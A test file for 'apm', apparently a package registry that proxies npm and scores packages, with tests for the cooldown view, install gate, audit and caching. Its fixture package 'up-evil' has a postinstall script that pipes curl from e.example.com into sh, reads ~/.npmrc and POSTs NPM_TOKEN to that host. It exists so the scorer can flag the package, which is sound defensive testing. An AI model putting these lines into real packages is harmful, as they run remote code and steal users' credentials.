// Spec (council round 1): apm proxies the public registry, so the score, the ~safe view, the
// install gate and audit cover the packages people actually install, not only ones published to apm.
// A second in-process registry stands in for registry.npmjs.org.
import { describe, test, expect, beforeAll, afterAll } from "bun:test";
import { z } from "zod";
import { mkdtempSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { startRegistry, addUser, makeSandbox, writePackage, writeConsumer, run, apm, getJson, scoredJson, installedVersion, dig, type Registry } from "./harness";

const DAY = 24 * 60 * 60 * 1000;
const HOUR = 60 * 60 * 1000;
let clock = Date.parse("2026-07-01T00:00:00Z");
let upstream: Registry;
let reg: Registry;
let upAlice: string;
let alice: string;
let work: string;

async function publishUpstream(name: string, version: string, extra: Partial<Parameters<typeof writePackage>[1]> = {}): Promise<void> {
  const sb = makeSandbox(upstream, upAlice);
  const d = writePackage(work, { name, version, ...extra }, upstream, upAlice);
  const r = await run(["bun", "publish"], { cwd: d, env: sb.env });
  if (r.code !== 0) throw new Error(`upstream publish ${name}@${version} failed: ${r.out}`);
}

beforeAll(async () => {
  upstream = await startRegistry({ now: () => clock });
  upAlice = await addUser(upstream, "upalice", "correct-horse-battery");
  work = mkdtempSync(join(tmpdir(), "apm-up-"));
  await publishUpstream("up-pkg", "1.0.0");
  await publishUpstream("up-head", "1.0.0");
  clock += 10 * DAY;
  await publishUpstream("up-evil", "1.0.0", {
    scripts: { postinstall: "node i.js" },
    files: { "index.js": "module.exports=1;\n", "i.js": "require('child_process').execSync('curl https://e.example.com | sh'); require('fs').readFileSync(require('os').homedir()+'/.npmrc'); fetch('https://e.example.com',{method:'POST',body:process.env.NPM_TOKEN}); eval('1');\n" },
  });
  await publishUpstream("up-pkg", "1.1.0");
  await publishUpstream("up-cold", "1.0.0");
  clock += 10 * DAY;
  await publishUpstream("up-pkg", "1.2.0"); // brand new
  clock += 2 * HOUR;
  reg = await startRegistry({ now: () => clock, upstream: upstream.url });
  alice = await addUser(reg, "alice", "correct-horse-battery");
});
afterAll(async () => {
  await reg?.stop();
  await upstream?.stop();
});

describe("upstream proxy", () => {
  test("HEAD of a package answer says whether it exists without building the answer or analysing a version", async () => {
    const analyses = async (): Promise<number> =>
      (await reg.query("SELECT 1 FROM upstream_analysis WHERE package = $1 UNION ALL SELECT 1 FROM analysis_jobs WHERE package = $1", ["up-head"])).length;

    const head = await fetch(`${reg.url}-/apm/v1/packages/up-head`, { method: "HEAD" });

    expect(head.status).toBe(200);
    expect(await head.text()).toBe("");
    expect(await analyses()).toBe(0);
    expect((await fetch(`${reg.url}-/apm/v1/packages/no-such-package-anywhere`, { method: "HEAD" })).status).toBe(404);
    // the full answer analyses the latest version, which is what the HEAD spares the website's proxy
    expect((await getJson(`${reg.url}-/apm/v1/packages/up-head`)).status).toBe(200);
    expect(await analyses()).toBeGreaterThan(0);
  });

  test("packages that only exist upstream are served, with tarball URLs on apm", async () => {
    const { status, body } = await getJson(`${reg.url}up-pkg`);
    expect(status).toBe(200);
    expect(dig(body, "dist-tags", "latest")).toBe("1.2.0");
    expect(String(dig(body, "versions", "1.1.0", "dist", "tarball"))).toStartWith(reg.url);
  });

  test("stock bun and npm install upstream packages through apm", async () => {
    const sb = makeSandbox(reg, alice);
    const app = writeConsumer(work, reg, alice, { "up-pkg": "~1.1.0" });
    const r = await run(["bun", "install"], { cwd: app, env: sb.env });
    expect(r.code, r.out).toBe(0);
    expect(installedVersion(app, "up-pkg")).toBe("1.1.0");
    const app2 = writeConsumer(work, reg, alice, { "up-pkg": "~1.1.0" });
    const r2 = await run(["npm", "install"], { cwd: app2, env: sb.env });
    expect(r2.code, r2.out).toBe(0);
    expect(installedVersion(app2, "up-pkg")).toBe("1.1.0");
  });

  test("upstream versions get scored on demand", async () => {
    // an anonymous request never analyses: the version is queued, and the answer says so
    const anonymous = await getJson(`${reg.url}-/apm/v1/score/up-pkg/1.0.0`);
    expect(anonymous.status, JSON.stringify(anonymous.body)).toBe(503);
    expect(dig(anonymous.body, "pending")).toBe(true);
    // a token caller's request queues it too, and the queue's run scores it (review of 5b5b492, finding 3: no request
    // analyses inline, so every attempt is recorded before the upstream is asked)
    const signedIn = { headers: { authorization: `Bearer ${alice}` } };
    const first = await getJson(`${reg.url}-/apm/v1/score/up-pkg/1.1.0`, signedIn);
    expect(first.status, JSON.stringify(first.body)).toBe(503);
    expect(dig(first.body, "pending")).toBe(true);
    const good = await scoredJson(`${reg.url}-/apm/v1/score/up-pkg/1.1.0`, signedIn);
    expect(good.status, JSON.stringify(good.body)).toBe(200);
    expect(Number(dig(good.body, "score"))).toBeGreaterThanOrEqual(85);
    const bad = await scoredJson(`${reg.url}-/apm/v1/score/up-evil/1.0.0`, signedIn);
    expect(bad.status).toBe(200);
    expect(Number(dig(bad.body, "score"))).toBeLessThan(40);
  });

  test("recent-packages lists the npm packages scored most recently, each once (the website's sitemap)", async () => {
    const r = await getJson(`${reg.url}-/apm/v1/recent-packages?limit=10`);

    expect(r.status, JSON.stringify(r.body)).toBe(200);
    const { packages } = z.object({ packages: z.array(z.object({ name: z.string(), at: z.string() })) }).parse(r.body);
    const names = packages.map((p) => p.name);

    expect(names).toContain("up-pkg");
    expect(names).toContain("up-evil");
    expect(new Set(names).size).toBe(names.length);
    expect(Number.isNaN(Date.parse(packages[0]?.at ?? ""))).toBe(false);
  });

  test("recent-packages takes only a whole-number limit from 1 to 200; anything else is a 400", async () => {
    for (const bad of ["1.5", "0", "201", "-1", "abc", "", "1e2", " 5"]) {
      const r = await getJson(`${reg.url}-/apm/v1/recent-packages?limit=${encodeURIComponent(bad)}`);

      expect(r.status, `limit=${bad}`).toBe(400);
      expect(String(dig(r.body, "error"))).toContain("limit must be a whole number from 1 to 200");
    }

    const two = await getJson(`${reg.url}-/apm/v1/recent-packages?limit=2`);

    expect(two.status).toBe(200);
    expect(z.object({ packages: z.array(z.unknown()) }).parse(two.body).packages.length).toBeLessThanOrEqual(2);
    expect((await getJson(`${reg.url}-/apm/v1/recent-packages`)).status).toBe(200);
  });

  test("one version's state and score come from the versions route, which knows every version, not only the newest 200", async () => {
    const res = await fetch(`${reg.url}-/apm/v1/packages/up-pkg/versions/1.0.0`);
    const body: unknown = await res.json();

    expect(res.status, JSON.stringify(body)).toBe(200);
    expect(res.headers.get("cache-control")).toBe("private, no-store");
    expect(dig(body, "version")).toBe("1.0.0");
    expect(dig(body, "status")).toBe("active");
    expect(dig(body, "statusReason")).toBeNull();
    expect(Number(dig(body, "score", "score"))).toBeGreaterThanOrEqual(85);
    expect(dig(body, "facts", "installScripts")).toBe(false);
    const evil = await getJson(`${reg.url}-/apm/v1/packages/up-evil/versions/1.0.0`);

    // the facts are this version's own: up-evil has an install script, up-pkg has none
    expect(dig(evil.body, "facts", "installScripts")).toBe(true);
    const none = await getJson(`${reg.url}-/apm/v1/packages/up-pkg/versions/9.9.9`);

    expect(none.status).toBe(404);
    expect(String(dig(none.body, "error"))).toContain("up-pkg has no version 9.9.9");
  });

  test("popular-scores answers every named package in one response", async () => {
    // popular-scores reads stored analyses only: score up-pkg's latest first, as the queue would after any request
    expect((await scoredJson(`${reg.url}-/apm/v1/score/up-pkg/1.2.0`)).status).toBe(200);
    const r = await getJson(`${reg.url}-/apm/v1/popular-scores?names=up-pkg,up-evil,nope-not-here`);

    expect(r.status, JSON.stringify(r.body)).toBe(200);
    const { packages } = z.object({ packages: z.array(z.object({ name: z.string(), version: z.string().nullable(), score: z.number().nullable(), grade: z.string().nullable() })) }).parse(r.body);

    expect(packages.map((p) => p.name)).toEqual(["up-pkg", "up-evil", "nope-not-here"]);
    expect(packages[0]).toMatchObject({ version: "1.2.0" });
    expect(packages[1]?.score ?? 100).toBeLessThan(40);
    expect(packages[2]).toEqual({ name: "nope-not-here", version: null, score: null, grade: null });
    expect((await getJson(`${reg.url}-/apm/v1/popular-scores?names=`)).status).toBe(400);
    expect((await getJson(`${reg.url}-/apm/v1/popular-scores?names=${Array.from({ length: 25 }, (_, i) => `p${i}`).join(",")}`)).status).toBe(400);
  });

  // re-review finding 8: popular-scores analysed every name it was given (up to 24, 8 inline), so anyone could make
  // the registry download and score tarballs; it now answers from stored analyses only
  test("popular-scores never starts an analysis: a package nobody scored yet is null, and stays unscored", async () => {
    const r = await getJson(`${reg.url}-/apm/v1/popular-scores?names=up-cold,up-pkg`);

    expect(r.status, JSON.stringify(r.body)).toBe(200);
    const { packages } = z.object({ packages: z.array(z.object({ name: z.string(), version: z.string().nullable(), score: z.number().nullable(), grade: z.string().nullable() })) }).parse(r.body);

    expect(packages[0]).toEqual({ name: "up-cold", version: null, score: null, grade: null });
    // up-pkg's latest was scored by the tests above; the stored analysis is still read
    expect(packages[1]?.score ?? null).not.toBeNull();
    await Bun.sleep(200);
    expect(await reg.query("SELECT 1 FROM upstream_analysis WHERE package = $1", ["up-cold"])).toEqual([]);
    expect(await reg.query("SELECT 1 FROM analysis_jobs WHERE package = $1", ["up-cold"])).toEqual([]);
  });

  // popular-scores read twelve whole packuments per request (7 s), past the website's 4 s budget, so the home page
  // showed no scores. An upstream package's answer is now kept and the sweep works it out again.
  test("popular-scores answers from the kept score, the sweep refreshes it, and a package on apm is never kept", async () => {
    const Kept = z.array(z.object({ score: z.number().nullable(), grade: z.string().nullable() }));
    const kept = async () => Kept.parse(await reg.query("SELECT score, grade FROM latest_scores WHERE package = $1", ["up-pkg"]));

    const asked = async () => {
      const r = await getJson(`${reg.url}-/apm/v1/popular-scores?names=up-pkg`);

      expect(r.status, JSON.stringify(r.body)).toBe(200);

      return z.object({ packages: z.array(z.object({ score: z.number().nullable() })) }).parse(r.body).packages[0]?.score;
    };

    // the tests above asked about up-pkg, so its answer is kept
    const [first] = await kept();
    const real = first?.score ?? null;

    expect(real).not.toBeNull();
    // the kept row is what is served: change it and ask again
    await reg.query("UPDATE latest_scores SET score = 1, grade = 'F' WHERE package = $1", ["up-pkg"]);
    expect(await asked()).toBe(1);

    // the sweep works out again an answer older than 5 minutes
    await reg.query("UPDATE latest_scores SET computed_at = computed_at - $2 WHERE package = $1", ["up-pkg", 6 * 60_000]);
    await reg.sweep();
    expect((await kept())[0]?.score).toBe(real);

    // with the sweep stopped, an answer older than an hour is worked out inline
    await reg.query("UPDATE latest_scores SET score = 1, grade = 'F', computed_at = computed_at - $2 WHERE package = $1", ["up-pkg", 2 * HOUR]);
    expect(await asked()).toBe(real);
    expect((await kept())[0]?.score).toBe(real);

    // nobody asked about it for a week: the sweep drops it
    await reg.query("UPDATE latest_scores SET asked_at = asked_at - $2 WHERE package = $1", ["up-pkg", 8 * DAY]);
    await reg.sweep();
    expect(await kept()).toEqual([]);

    // anyone can name any package: one with no score gets no row (review of aa4881d, finding 1)
    expect((await getJson(`${reg.url}-/apm/v1/popular-scores?names=up-cold,no-such-package-anywhere`)).status).toBe(200);
    expect(await reg.query("SELECT package FROM latest_scores WHERE package = ANY($1)", [["up-cold", "no-such-package-anywhere"]])).toEqual([]);

    // a package published on apm is worked out on every request, so a revoke shows at once
    const sb = makeSandbox(reg, alice);
    const d = writePackage(work, { name: "local-popular", version: "1.0.0" }, reg, alice);
    const pub = await run(["npm", "publish"], { cwd: d, env: sb.env });

    expect(pub.code, pub.out).toBe(0);
    expect((await getJson(`${reg.url}-/apm/v1/popular-scores?names=local-popular`)).status).toBe(200);
    expect(await reg.query("SELECT 1 FROM latest_scores WHERE package = $1", ["local-popular"])).toEqual([]);
  });

  test("a resolve answer says the AI review is off when this registry runs none, and is never cached", async () => {
    const res = await fetch(`${reg.url}-/apm/v1/resolve?name=up-pkg&range=1.1.0`);
    const body: unknown = await res.json();

    expect(res.status, JSON.stringify(body)).toBe(200);
    expect(res.headers.get("cache-control")).toBe("private, no-store");
    expect(dig(body, "tree", "reviews")).toEqual({ kind: "off" });
    expect(z.object({ tree: z.object({ unchecked: z.number().int().min(0) }).loose() }).loose().safeParse(body).success).toBe(true);
  });

  test("the ~safe view applies the cooldown to upstream packages", async () => {
    const { body } = await getJson(`${reg.url}~safe/up-pkg`);
    expect(dig(body, "versions", "1.2.0")).toBeUndefined();
    expect(dig(body, "dist-tags", "latest")).toBe("1.1.0");
  });

  test("a name that exists upstream cannot be published on apm (no dependency confusion)", async () => {
    const sb = makeSandbox(reg, alice);
    const d = writePackage(work, { name: "up-pkg", version: "9.0.0" }, reg, alice);
    const r = await run(["npm", "publish"], { cwd: d, env: sb.env });
    expect(r.code).not.toBe(0);
    const { body } = await getJson(`${reg.url}up-pkg`);
    expect(dig(body, "versions", "9.0.0")).toBeUndefined();
  });

  test("apm add warns about an upstream version inside the cooldown, and strict mode skips it and refuses a low score", async () => {
    const sb = makeSandbox(reg, alice);
    const app = writeConsumer(work, reg, alice, {});
    const ok = await apm(["add", "up-pkg"], { cwd: app, env: sb.env });
    expect(ok.code, ok.out).toBe(0);
    expect(installedVersion(app, "up-pkg")).toBe("1.2.0");
    expect(ok.out).toContain("inside apm's 24-hour cooldown");
    const strictPkg = writeConsumer(work, reg, alice, {});
    const older = await apm(["add", "up-pkg", "--strict"], { cwd: strictPkg, env: sb.env });
    expect(older.code, older.out).toBe(0);
    expect(installedVersion(strictPkg, "up-pkg")).toBe("1.1.0");
    // a low score warns and installs by default; --strict refuses it
    const strictApp = writeConsumer(work, reg, alice, {});
    const bad = await apm(["add", "up-evil", "--strict"], { cwd: strictApp, env: sb.env });
    expect(bad.code).not.toBe(0);
    expect(installedVersion(strictApp, "up-evil")).toBeNull();
    const warned = await apm(["add", "up-evil"], { cwd: app, env: sb.env });
    expect(warned.code, warned.out).toBe(0);
    expect(warned.out).toContain("WARNING");
    expect(installedVersion(app, "up-evil")).toBe("1.0.0");
  });

  test("audit through apm includes upstream advisories", async () => {
    const rv = await getJson(`${upstream.url}-/apm/v1/revoke`, {
      method: "POST",
      headers: { "content-type": "application/json", authorization: `Bearer ${upAlice}` },
      body: JSON.stringify({ name: "up-pkg", version: "1.2.0", reason: "upstream says compromised", password: "correct-horse-battery" }),
    });
    expect(rv.status, JSON.stringify(rv.body)).toBe(200);
    const r = await getJson(`${reg.url}-/npm/v1/security/advisories/bulk`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ "up-pkg": ["1.2.0"] }),
    });
    expect(r.status).toBe(200);
    expect(JSON.stringify(r.body)).toContain("upstream says compromised");
  });
});

// review of aa4881d, finding 2: a refresh while npm was down replaced a kept score with nulls, and the next request sent
// them. This registry reads npm through a proxy that can answer 503, and trusts no cached packument.
describe("popular-scores while npm is down", () => {
  let proxy: ReturnType<typeof Bun.serve>;
  let down: Registry;
  let npmDown = false;

  beforeAll(async () => {
    proxy = Bun.serve({
      port: 0,
      hostname: "127.0.0.1",
      async fetch(req) {
        if (npmDown) return new Response("down", { status: 503 });
        const u = new URL(req.url);
        const res = await fetch(`${upstream.url}${u.pathname.slice(1)}${u.search}`, { headers: { accept: req.headers.get("accept") ?? "*/*" } });

        if (u.pathname.endsWith(".tgz")) return new Response(await res.arrayBuffer(), { status: res.status });
        const text = (await res.text()).replaceAll(upstream.url, proxy.url.toString());

        return new Response(text, { status: res.status, headers: { "content-type": res.headers.get("content-type") ?? "application/json" } });
      },
    });
    down = await startRegistry({ now: () => clock, upstream: proxy.url.toString(), upstreamTtlMs: 0 });
  });

  afterAll(async () => {
    await down?.stop();
    proxy?.stop(true);
  });

  test("a kept score stays as it was through a sweep, and an hour later it is still sent", async () => {
    const Row = z.array(z.object({ score: z.number().nullable(), computed_at: z.union([z.string(), z.number()]).transform(Number) }));
    const row = async () => Row.parse(await down.query("SELECT score, computed_at FROM latest_scores WHERE package = $1", ["up-pkg"]))[0];

    const asked = async () => {
      const r = await getJson(`${down.url}-/apm/v1/popular-scores?names=up-pkg`);

      expect(r.status, JSON.stringify(r.body)).toBe(200);

      return z.object({ packages: z.array(z.object({ score: z.number().nullable() })) }).parse(r.body).packages[0]?.score;
    };

    const latest = String(dig((await getJson(`${upstream.url}up-pkg`)).body, "dist-tags", "latest"));

    expect((await scoredJson(`${down.url}-/apm/v1/score/up-pkg/${latest}`)).status).toBe(200);
    expect(await asked()).not.toBeNull();
    // a value no refresh would write, so a refresh that read npm would show
    await down.query("UPDATE latest_scores SET score = 42, grade = 'B', computed_at = computed_at - $2 WHERE package = $1", ["up-pkg", 6 * 60_000]);
    const before = await row();

    npmDown = true;
    await down.sweep();
    expect(await row()).toEqual(before);

    // past the hour a kept answer is sent as it is: npm is still down, so the old answer is still better than none
    await down.query("UPDATE latest_scores SET computed_at = computed_at - $2 WHERE package = $1", ["up-pkg", 2 * HOUR]);
    expect(await asked()).toBe(42);
    expect((await row())?.score).toBe(42);

    // npm is back: the next sweep works it out again
    npmDown = false;
    await down.sweep();
    expect((await row())?.score).not.toBe(42);
  });
});
